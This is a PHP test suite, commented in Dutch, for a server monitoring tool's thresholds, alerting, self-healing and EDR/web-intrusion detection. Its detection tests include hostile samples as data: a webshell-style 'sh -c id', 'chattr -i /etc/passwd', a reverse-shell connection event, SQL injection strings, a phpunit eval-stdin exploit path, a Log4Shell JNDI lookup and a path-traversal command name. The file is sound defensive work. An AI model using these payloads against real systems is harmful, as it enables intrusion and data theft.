<?php
/**
 * PHP-tests (GitHub Actions, met een lege MariaDB): de rekenkant van slimme drempels, bundelen, zelf herstellen,
 * de statuspagina en Analyse, en dat een update geen instellingen verandert.
 * Gebruik: php tests/php/run.php   (op een testdatabase: de tests voegen checks en meetwaarden toe)
 */
declare(strict_types=1);

if (PHP_SAPI !== 'cli') {
    exit("Alleen via CLI\n");
}
require __DIR__ . '/../../src/bootstrap.php';
I18n::set('nl');

$fails = 0;
$n = 0;
function ok(bool $cond, string $what): void
{
    global $fails, $n;
    $n++;
    if ($cond) {
        echo "  ✔ $what\n";
    } else {
        $fails++;
        echo "  ✘ $what\n";
    }
}
function section(string $s): void
{
    echo "\n$s\n";
}

section('Database en update');
Installer::runSchema();
save_setting('thresh_default', 'manual');
Installer::runSchema();
ok(setting('thresh_default') === 'manual' || q("SELECT value FROM settings WHERE name = 'thresh_default'")->fetchColumn() === 'manual', 'een update laat een gewijzigde instelling staan');
q("INSERT INTO hosts (name, address, mode) VALUES ('ci-a', '10.0.0.1', 'agent'), ('ci-b', '10.0.0.2', 'agent'), ('ci-gw', '10.0.0.254', 'remote')");
$ha = (int) q("SELECT id FROM hosts WHERE name = 'ci-a'")->fetchColumn();
$hb = (int) q("SELECT id FROM hosts WHERE name = 'ci-b'")->fetchColumn();
$gw = (int) q("SELECT id FROM hosts WHERE name = 'ci-gw'")->fetchColumn();
q('INSERT INTO checks (host_id, type, name, warn_threshold, crit_threshold) VALUES (?, ?, ?, 85, 95)', [$ha, 'cpu', 'CPU']);
$cpu = (int) db()->lastInsertId();
ok(q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() === 'auto', 'een nieuwe check begint op "auto"');

section('Slimme drempels');
mt_srand(7);
$rows = [];
for ($t = time() - 28 * 86400; $t < time(); $t += 600) {
    $h = (int) date('G', $t);
    $v = 20 + 15 * sin(($h - 6) / 24 * M_PI) + mt_rand(0, 80) / 10;
    if ($h === 3) {
        $v = 92 + mt_rand(0, 70) / 10;   // back-up 's nachts
    }
    if (time() - $t < 7 * 86400) {
        $v += 12;                        // sluipende stijging
    }
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $cpu, $v, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
q("UPDATE checks SET thresh_mode = 'manual' WHERE id = ?", [$cpu]);
$m = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cpu])->fetch());
$mon3 = 3;          // maandag 3:00
$mon14 = 14;        // maandag 14:00
ok($m !== null && $m['days'] >= 7, 'leert uit 28 dagen meetwaarden');
ok($m['w'][$mon3] > 100, 'de back-up om 3:00 is normaal: warning boven 100% (' . round($m['w'][$mon3]) . ')');
ok($m['w'][$mon14] >= 50 && $m['w'][$mon14] < 85, 'overdag een warning tussen 50 en 85% (' . round($m['w'][$mon14]) . ')');
ok(($m['sim']['fixed'] ?? 0) > ($m['sim']['smart'] ?? 99), 'slim geeft minder dagen met een warning dan vast (' . $m['sim']['fixed'] . ' → ' . $m['sim']['smart'] . ')');
ok($m['drift'] !== null, 'de sluipende stijging wordt gezien');
$row = q('SELECT c.*, h.mode FROM checks c JOIN hosts h ON h.id = c.host_id WHERE c.id = ?', [$cpu])->fetch();
$row['thresh_mode'] = 'guard';
$row['guard_threshold'] = 90;
$eff = Smart::apply($row);
ok((float) $eff['crit_threshold'] <= 90, 'het vangnet geldt altijd (critical ≤ 90)');
ok(!Smart::eligible(['type' => 'disk']), 'disks leren niet');
ok(Smart::eligible(['type' => 'snmp', 'metric' => 'temp']) && !Smart::eligible(['type' => 'snmp', 'metric' => 'uptime']), 'SNMP: temperatuur wel, uptime niet');
ok(!Smart::eligible(['type' => 'ping', 'reverse_ok' => 1]), 'omgekeerde checks leren niet');
q("UPDATE checks SET thresh_mode = 'auto' WHERE id = ?", [$cpu]);
save_setting('thresh_default', 'guard');
$r2 = Smart::apply(q('SELECT * FROM checks WHERE id = ?', [$cpu])->fetch() + ['hid' => $ha]);
ok(q('SELECT thresh_mode FROM checks WHERE id = ?', [$cpu])->fetchColumn() !== 'auto', '"auto" wordt bij de eerste run de standaard');

// 1.108.1: grillige check (camera-webinterface): elke dag één losse piek. Telt zoals een melding (melden na N).
q("INSERT INTO checks (host_id, type, target, name, warn_threshold, crit_threshold, thresh_mode) VALUES (?, 'http', 'http://cam', 'Camera', 500, 2000, 'manual')", [$ha]);
$cam = (int) db()->lastInsertId();
$rows = [];
for ($t = time() - 14 * 86400; $t < time(); $t += 300) {
    $spike = (int) date('G', $t) === ((int) date('j', $t) * 7) % 24 && (int) date('i', $t) < 5;   // elke dag op een ander uur
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $cam, $spike ? 3000 : 90 + mt_rand(0, 300) / 10, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
$m1 = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cam])->fetch());
ok($m1['sim']['need'] === 1 && $m1['sim']['fixed'] >= 13 && $m1['sim']['spiky'], 'melden na 1: elke dag een warning, en grillig (' . $m1['sim']['fixed'] . '/' . $m1['sim']['smart'] . ')');
q('UPDATE checks SET notify_fails = 3 WHERE id = ?', [$cam]);
$m3 = Smart::learn(q('SELECT * FROM checks WHERE id = ?', [$cam])->fetch());
ok($m3['sim']['need'] === 3 && $m3['sim']['fixed'] === 0 && $m3['sim']['smart'] === 0, 'melden na 3: losse pieken tellen niet als dag met warning');
$prop = array_values(array_filter(Smart::proposals(), static fn($p) => $p['id'] === $cam))[0] ?? null;
ok($prop && $prop['gain'] === 0 && $prop['spiky'] && $prop['need'] === 3, 'voorstel: geen winst, grillig');

section('Bundelen');
q('UPDATE hosts SET parent_id = ? WHERE id IN (?, ?)', [$gw, $ha, $hb]);
$items = [];
foreach ([$ha, $hb] as $h) {
    $items[] = ['item' => ['status' => STATUS_CRIT], 'check' => ['hid' => $h]];
}
$cause = Bundle::cause($items);
ok($cause !== null && str_contains($cause, 'ci-gw'), 'gemeenschappelijke oorzaak: dezelfde server erboven');
ok(str_contains(Bundle::title($items, $cause), '2'), 'titel noemt het aantal servers');
q('UPDATE hosts SET parent_id = NULL WHERE id IN (?, ?)', [$ha, $hb]);
ok(Bundle::cause([$items[0]]) === null, 'één server is geen bundel');

section('Zelf herstellen en waakhond');
ok(Heal::clean(['type' => 'service'], 'restart') === 'restart', 'herstarten mag bij een service');
ok(Heal::clean(['type' => 'ping'], 'restart') === null, 'herstarten mag niet bij een ping-check');
ok(Heal::clean(['type' => 'ping'], 'cmd:fix-db') === 'cmd:fix-db', 'een herstelcommando op naam');
ok(Heal::clean(['type' => 'ping'], 'cmd:../../bin/sh') === null, 'geen paden in de naam van een herstelcommando');
save_setting('pushover_enabled', '1');
save_setting('pushover_user', 'ci-user');
save_setting('pushover_token', 'ci-token');
q('UPDATE hosts SET watchdog = 1, watchdog_min = 3 WHERE id = ?', [$ha]);
$plain = implode("\n", Heal::testLines($ha, false));
$secure = implode("\n", Heal::testLines($ha, true));
ok(str_contains($secure, 'ci-token') && !str_contains($plain, 'ci-token'), 'Pushover-gegevens alleen in een versleutelde lijst');

section('Statuspagina');
StatusPage::save(['on' => true, 'title' => 'Thuis', 'items' => [['label' => 'CPU', 'checks' => [$cpu]], ['label' => '', 'checks' => [1]]]]);
ok(count(StatusPage::items()) === 1, 'onderdelen zonder naam vallen weg');
ok(StatusPage::on() && preg_match('/^[a-f0-9]{32}$/', StatusPage::token()) === 1, 'aan, met een geheime sleutel');
$d = StatusPage::data();
ok($d['title'] === 'Thuis' && count($d['components'][0]['days']) === StatusPage::DAYS, 'pagina met 90 dagen per onderdeel');

section('Analyse');
Analytics::cron();
$rep = Analytics::report('7d');
ok(isset($rep['kpi'], $rep['todo'], $rep['reliability']), 'rapport over 7 dagen');

section('Slimme voorstellen (1.108.0)');
// Een check die 6× kort misging (binnen 2 minuten weer goed), elke nacht om 2:05
q('INSERT INTO checks (host_id, type, target, name, interval_sec, thresh_mode) VALUES (?, ?, ?, ?, 60, ?)', [$hb, 'tcp', '22', 'SSH', 'manual']);
$ssh = (int) db()->lastInsertId();
for ($d = 6; $d >= 1; $d--) {
    $t = strtotime(date('Y-m-d', strtotime("-$d days")) . ' 02:05:00');
    q('INSERT INTO status_changes (check_id, from_status, to_status, message, created_at) VALUES (?, 0, 2, ?, ?), (?, 2, 0, ?, ?)',
        [$ssh, 'down', date('Y-m-d H:i:s', $t), $ssh, 'up', date('Y-m-d H:i:s', $t + 100)]);
}
// Samen uitvallen: ci-b valt 4× tegelijk uit met ci-gw (een router)
q("UPDATE hosts SET kind = 'router' WHERE id = ?", [$gw]);
q('INSERT INTO checks (host_id, type, name) VALUES (?, ?, ?)', [$gw, 'ping', 'Ping']);
$gwPing = (int) db()->lastInsertId();
q('INSERT INTO checks (host_id, type, name) VALUES (?, ?, ?)', [$hb, 'ping', 'Ping']);
$bPing = (int) db()->lastInsertId();
for ($i = 1; $i <= 4; $i++) {
    $t = date('Y-m-d H:i:s', strtotime("-$i days 14:00"));
    q('INSERT INTO status_changes (check_id, from_status, to_status, message, created_at) VALUES (?, 0, 2, ?, ?), (?, 0, 2, ?, ?)', [$gwPing, 'x', $t, $bPing, 'x', $t]);
}
$nAdv = Advice::cron(true);
$adv = Advice::list();
$kinds = array_count_values(array_column($adv, 'kind'));
ok(($kinds['fails'] ?? 0) >= 1, 'voorstel: melden na meer mislukte checks');
ok(($kinds['maint'] ?? 0) >= 1, 'voorstel: vast onderhoudsvenster rond 2:00');
ok(($kinds['dep'] ?? 0) >= 1 && in_array('ci-gw', array_column($adv, 'parent'), true), 'voorstel: ci-b hangt af van ci-gw');
foreach ($adv as $a) {
    Advice::decide($a['id'], true);
}
ok((int) q('SELECT notify_fails FROM checks WHERE id = ?', [$ssh])->fetchColumn() >= 2, 'toegepast: melden na N staat hoger');
ok((int) q('SELECT parent_id FROM hosts WHERE id = ?', [$hb])->fetchColumn() === $gw, 'toegepast: afhankelijkheid ingesteld');
$w = q('SELECT * FROM maint_windows LIMIT 1')->fetch();
ok($w && $w['start'] === '01:55', 'toegepast: venster vanaf 01:55, net voor de storingen van 2:05 (' . ($w['start'] ?? '-') . ', ' . ($w['minutes'] ?? '-') . ' min)');
$in = strtotime(date('Y-m-d') . ' 02:10:00');
ok(Advice::windowFor($ssh, $hb, $in) !== null && Advice::windowFor($ssh, $hb, $in + 3 * 3600) === null, 'venster geldt om 2:10, niet om 5:10');
Advice::cron(true);
ok(Advice::openCount() === 0, 'toegepaste voorstellen komen niet terug');

section('Escaleren, oorzaak, afwijkingen, disk, heartbeat, interval');
$esc = new ReflectionMethod('Monitor', 'escalation');
save_setting('esc_on', '0');
ok($esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 3600) === null, 'escaleren uit: niets');
save_setting('esc_on', '1');
save_setting('esc_crit_min', '15');
save_setting('esc_quiet', '0');
ok($esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 600) === null && $esc->invoke(null, ['id' => $ssh], STATUS_CRIT, 1000) === 2, 'critical na 15 min → nood (prioriteit 2)');
q("INSERT INTO alerts (check_id, host_id, status, title, message, kind, created_at) VALUES (NULL, ?, 0, 'ℹ️ INFO: ci-b', 'Agent bijgewerkt van 1.61.1 naar 1.62.0', 'info', NOW() - INTERVAL 3 MINUTE)", [$hb]);
$why = Context::recent(['hid' => $hb]);
ok(str_contains($why, 'Agent bijgewerkt') && str_contains($why, '3 min'), 'oorzaak erbij: ' . $why);
// Afwijking: een SNMP-interfacecheck zonder drempels, normaal ~10, dan 3× 500
q("INSERT INTO checks (host_id, type, metric, target, name, thresh_mode) VALUES (?, 'snmp', 'if', '1', 'eth0', 'manual')", [$ha]);
$if = (int) db()->lastInsertId();
$rows = [];
for ($t = time() - 10 * 86400; $t < time(); $t += 900) {
    $rows[] = sprintf('(%d, 0, %.2f, %s)', $if, 10 + mt_rand(0, 30) / 10, db()->quote(date('Y-m-d H:i:s', $t)));
}
foreach (array_chunk($rows, 1000) as $ch) {
    q('INSERT INTO results (check_id, status, value, created_at) VALUES ' . implode(',', $ch));
}
$ifRow = q('SELECT c.*, h.name AS host_name, h.id AS hid FROM checks c JOIN hosts h ON h.id = c.host_id WHERE c.id = ?', [$if])->fetch();
ok(Smart::anomEligible($ifRow) && Smart::learnAnom($ifRow) !== null, 'leert wat normaal is bij een check zonder drempels');
$before = (int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% eth0'")->fetchColumn();
for ($i = 0; $i < 3; $i++) {
    $ifRow['anom_streak'] = $i;
    Smart::anomaly($ifRow, ['value' => 500.0, 'status' => 0]);
}
ok((int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% eth0'")->fetchColumn() === $before + 1, 'afwijking na 3 metingen: één ℹ️');
// Disk groeit hard
q("INSERT INTO checks (host_id, type, target, name, warn_threshold, crit_threshold, thresh_mode) VALUES (?, 'disk', '/var', 'Disk /var', 80, 90, 'manual')", [$ha]);
$disk = (int) db()->lastInsertId();
q('INSERT INTO results (check_id, status, value, created_at) VALUES (?, 0, 50, NOW() - INTERVAL 60 MINUTE)', [$disk]);
$dj = new ReflectionMethod('Monitor', 'diskJump');
$dj->invoke(null, ['id' => $disk, 'hid' => $ha, 'host_name' => 'ci-a', 'name' => 'Disk /var'], ['value' => 61.0]);
ok((int) q("SELECT COUNT(*) FROM alerts WHERE title LIKE '% Disk /var'")->fetchColumn() === 1, 'disk groeit hard: +11 procentpunt in een uur');
// Heartbeat: elke dag rond 2:10, vandaag om 3:00 nog niets
$late = new ReflectionMethod('Heartbeat', 'lateByRhythm');
$oks = [];
for ($d = 6; $d >= 1; $d--) {
    $oks[] = strtotime(date('Y-m-d', strtotime("-$d days")) . ' 02:' . sprintf('%02d', 8 + $d));
}
$msg = $late->invoke(null, ['oks' => $oks], strtotime(date('Y-m-d') . ' 03:00:00'));
ok($msg !== null && str_contains($msg, '02:1'), 'heartbeat te laat volgens zijn ritme: ' . $msg);
ok($late->invoke(null, ['oks' => $oks], strtotime(date('Y-m-d') . ' 02:15:00')) === null, 'heartbeat om 2:15 nog op tijd');
$odd = new ReflectionMethod('Heartbeat', 'oddValue');
ok($odd->invoke(null, ['vals' => [40, 41, 39, 42, 40, 12]], 'GB') !== null, 'back-up veel kleiner dan normaal');
// Slim interval: de query klopt (geen fout) en een check met een probleem is sneller aan de beurt
save_setting('smart_interval', '1');
$sql = new ReflectionMethod('Monitor', 'intervalSql');
$iv = $sql->invoke(null);
q("UPDATE checks SET status = 2, fail_count = 1, interval_sec = 300, last_checked = NOW() - INTERVAL 30 SECOND WHERE id = ?", [$bPing]);
ok((int) q("SELECT COUNT(*) FROM checks c WHERE c.id = ? AND c.last_checked <= NOW() - INTERVAL ($iv - LEAST(15, $iv DIV 4)) SECOND", [$bPing])->fetchColumn() === 1,
    'slim interval: probleem → na 20 s al weer aan de beurt (interval 5 min)');
// 1.108.2: melden na 3 telt met slim interval ook in tijd (3 gewone checks = 2 minuten), niet 3× 20 s
$p3 = ['type' => 'ping', 'notify_fails' => 3, 'interval_sec' => 60];
ok(!Monitor::failsReached($p3, 3, 40) && Monitor::failsReached($p3, 7, 110), 'slim interval: melden na 3 = na ~2 minuten, niet na 40 s');
ok(Monitor::failsReached(['type' => 'cpu', 'notify_fails' => 3, 'interval_sec' => 60], 3, 0), 'checks die niet sneller gaan: gewoon N keer');
save_setting('smart_interval', '0');
ok(Monitor::failsReached($p3, 3, 0) && !Monitor::failsReached($p3, 2, 999), 'zonder slim interval: gewoon N keer');


section('Endpoint-bewaking en inspectie (1.110.0)');
save_setting('ids_enabled', '1');
save_setting('ids_mode', 'learn');
Edr::reset();
ok(count(Sigma::rules()) > 100, 'Sigma-regels geladen (' . count(Sigma::rules()) . ')');
$host = q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch();
$ws = ['k' => 'x', 't' => time(), 'pid' => 4242, 'st' => 777, 'uid' => 33, 'u' => 'www-data', 'exe' => '/usr/bin/dash', 'comm' => 'sh', 'argv' => ['sh', '-c', 'id'], 'cmd' => 'sh -c id', 'pc' => 'php-fpm8.2'];
$r = Edr::process($host, ['ev' => [$ws], 'info' => ['audit' => 'ok', 'file' => 'missing', 'fam' => 'deb']]);
$inc = q("SELECT * FROM ids_incidents WHERE host_id = ? AND type = 'edr' ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok($inc && (int) $inc['severity'] === 2 && str_starts_with((string) $inc['dkey'], 'rz-webshell|'), 'webserver start een shell → critical (eigen regel)');
ok($r === [] && str_contains((string) $inc['detail'], 'Leren'), 'modus Leren: niets gestopt, wel gemeld');
ok(count(Edr::evidenceFor((int) $inc['id'])) === 1, 'bewijs bij het incident');
save_setting('ids_mode', 'block');
$ws['pid'] = 4243;
$r = Edr::process($host, ['ev' => [$ws]]);
ok(($r['edr_kill'] ?? null) === [[4243, 777]] && (int) q('SELECT COUNT(*) FROM ids_kills WHERE host_id = ? AND pid = 4243', [$ha])->fetchColumn() === 1, 'modus Blokkeren: proces wordt meteen gestopt');
$st = Edr::status(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch());
ok($st['missing'] === ['inotify'], 'ontbrekend onderdeel gemeld: inotify-tools');
// Sigma-regel (alleen Sigma kent deze): chattr -i
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 50, 'st' => 1, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/chattr', 'comm' => 'chattr', 'argv' => ['chattr', '-i', '/etc/passwd'], 'cmd' => 'chattr -i /etc/passwd', 'pc' => 'bash']]]);
$sig = q("SELECT i.* FROM ids_incidents i WHERE host_id = ? AND type = 'edr' AND title LIKE 'Sigma:%' ORDER BY id DESC LIMIT 1", [$ha])->fetch();
ok($sig && (int) $sig['severity'] === 1 && str_contains((string) $sig['detail'], 'SigmaHQ'), 'Sigma-regel raak, met bronvermelding: ' . ($sig['title'] ?? '-'));
// Reverse shell via het netwerk: shell met een verbinding naar buiten
Edr::process($host, ['ev' => [['k' => 'n', 't' => time(), 'dir' => 'out', 'pid' => 61, 'st' => 2, 'exe' => '/usr/bin/bash', 'comm' => 'bash', 'rip' => '203.0.113.9', 'rp' => 9001, 'lp' => 51234]]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE host_id = ? AND type = 'edr' AND dkey LIKE 'rz-net-shell|%' AND ip = '203.0.113.9'", [$ha])->fetchColumn() === 1, 'shell met een verbinding naar buiten → critical');
// Gewoon proces: geen incident, wel in Live en in edr_seen
$before = (int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'edr'")->fetchColumn();
Edr::process($host, ['ev' => [['k' => 'x', 't' => time(), 'pid' => 70, 'st' => 3, 'uid' => 0, 'u' => 'root', 'exe' => '/usr/bin/ls', 'comm' => 'ls', 'argv' => ['ls', '-la'], 'cmd' => 'ls -la', 'pc' => 'bash']]]);
ok((int) q("SELECT COUNT(*) FROM ids_incidents WHERE type = 'edr'")->fetchColumn() === $before && count(Edr::feed(10, $ha)) >= 4, 'gewoon proces: alleen in Live');
// Per server uit: niets verwerken
q('UPDATE hosts SET edr_on = 0 WHERE id = ?', [$ha]);
$n0 = (int) q('SELECT COUNT(*) FROM edr_events')->fetchColumn();
Edr::process(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch(), ['ev' => [$ws]]);
ok((int) q('SELECT COUNT(*) FROM edr_events')->fetchColumn() === $n0 && Edr::agentLines(q('SELECT * FROM hosts WHERE id = ?', [$ha])->fetch()) === [], 'per server uit: geen sensoren, niets verwerkt');
q('UPDATE hosts SET edr_on = 1 WHERE id = ?', [$ha]);
// Web: SQL-injectie en een bekende exploit, wachtwoord gemaskeerd, IP geblokkeerd
$a = Inspect::analyze('GET', "/item.php?id=1%27%20UNION%20SELECT%20password%20FROM%20users--", 'Mozilla/5.0');
ok(in_array('sqli', array_column($a['tech'], 0), true), 'SQL-injectie herkend (URL-gecodeerd)');
ok((Inspect::analyze('POST', '/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php', 'curl')['cve'][0] ?? '') === 'CVE-2017-9841', 'bekende exploit met CVE herkend');
ok(Inspect::analyze('GET', '/index.php?page=home', 'Mozilla/5.0')['tech'] === [], 'gewoon verzoek: niets');
ok(Inspect::redact('/login?user=a&password=geheim&x=1') === '/login?user=a&password=***&x=1', 'wachtwoord in de query gemaskeerd');
Inspect::requests($host, [['198.51.100.7', time(), 'GET', "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fx.y%2Fa%7D", 404, 0, 'Mozilla/5.0', '-']]);
$wi = q("SELECT * FROM ids_incidents WHERE type = 'web_payload' AND ip = '198.51.100.7'")->fetch();
ok($wi && str_contains((string) $wi['title'], 'Log4Shell') && str_contains((string) $wi['detail'], '⛔'), 'Log4Shell-poging: incident en IP geblokkeerd');
// Zoals de agent het stuurt: tijd uit de log, " als \x22 (nginx)
Inspect::requests($host, [['192.0.2.50', '28/Oct/2026:10:00:02 +0100', 'GET', '/?x=1\\x22 OR \\x221\\x22=\\x221', 200, 10, 'Mozilla/5.0', '-']]);
$ev = q("SELECT e.data FROM ids_evidence e JOIN ids_incidents i ON i.id = e.incident_id WHERE i.ip = '192.0.2.50'")->fetchColumn();
$evd = json_decode((string) $ev, true)['ev'] ?? [];
ok(($evd['uri'] ?? '') === '/?x=1" OR "1"="1' && ($evd['at'] ?? 0) === 1793178002, 'verzoek van de agent: \\x22 teruggezet, tijd uit de log (' . ($evd['uri'] ?? '-') . ')');
save_setting('ids_mode', 'learn');

echo "\n" . ($fails ? "✘ $fails van $n mislukt\n" : "✔ alle $n tests geslaagd\n");
exit($fails ? 1 : 0);
